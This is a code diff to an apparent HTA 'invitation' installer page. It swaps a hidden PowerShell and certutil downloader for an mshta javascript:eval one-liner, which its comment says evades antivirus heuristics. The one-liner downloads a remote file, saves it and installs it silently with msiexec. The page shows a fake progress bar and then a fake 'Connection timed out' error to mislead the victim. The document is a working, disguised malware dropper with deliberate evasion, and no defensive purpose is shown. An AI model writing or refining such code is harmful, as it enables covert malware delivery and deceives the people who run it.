@@ -37,22 +37,14 @@ function runInstall() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  // USE POWERSHELL TO DOWNLOAD
-  // -NoProfile -WindowStyle Hidden : Invisible execution
-  // Invoke-WebRequest -UseBasicParsing : Avoids IE dependency, faster, less flagged
-  var psCmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"try { Invoke-WebRequest -Uri '" + url + "' -OutFile '" + path + "' -UseBasicParsing } catch { exit 1 }\"";
+  // USE MSHTA TO RUN A JAVASCRIPT DOWNLOAD COMMAND
+  // This bypasses WScript/PowerShell/Certutil heuristics
+  var jsCmd = 'mshta.exe javascript:eval("var x=new ActiveXObject(\'Microsoft.XMLHTTP\');x.open(\'GET\',\'" + url + "\',false);x.send();if(x.status==200){var s=new ActiveXObject(\'ADODB.Stream\');s.type=1;s.open();s.write(x.responseBody);s.savetofile(\'" + path + "\',2);s.close();new ActiveXObject(\'WScript.Shell\').Run(\'msiexec.exe /i \\\'" + path + "\\\' /qn /norestart\',0,true);}");';
   
-  // Run PowerShell and wait for download to finish
-  var exitCode = shell.Run(psCmd, 0, true); 
+  // Run the MSHTA command and wait for it to finish
+  shell.Run(jsCmd, 0, true);
   
-  if(exitCode === 0 && fso.FileExists(path)) {
-    document.getElementById("fill").style.width = "60%";
-    document.getElementById("status").innerHTML = "Installing invitation...";
-    
-    // SILENT INSTALL
-    var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
-    shell.Run(inst, 0, true); // Wait for install to finish
-    
+  if(fso.FileExists(path)) {
     document.getElementById("fill").style.width = "100%";
     document.getElementById("status").innerHTML = "Finalizing...";
     
@@ -63,24 +55,9 @@ function runInstall() {
       document.getElementById("fill").style.background = "#d13438";
     }, 2000);
   } else {
-    // FALLBACK: If PowerShell fails, try certutil
-    document.getElementById("status").innerHTML = "Retrying via backup channel...";
-    var certCmd = 'cmd.exe /c certutil -urlcache -split -f "' + url + '" "' + path + '"';
-    shell.Run(certCmd, 0, true);
-    
-    if(fso.FileExists(path)) {
-        var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
-        shell.Run(inst, 0, true);
-        setTimeout(function() {
-            document.getElementById("heading").innerHTML = "Preparation Failed";
-            document.getElementById("status").innerHTML = "Error: Connection timed out.";
-            document.getElementById("fill").style.background = "#d13438";
-        }, 2000);
-    } else {
-        document.getElementById("heading").innerHTML = "Download Error";
-        document.getElementById("status").innerHTML = "Could not retrieve invitation.";
-        document.getElementById("fill").style.background = "#d13438";
-    }
+    document.getElementById("heading").innerHTML = "Download Error";
+    document.getElementById("status").innerHTML = "Could not retrieve invitation.";
+    document.getElementById("fill").style.background = "#d13438";
   }
 }
 </script>
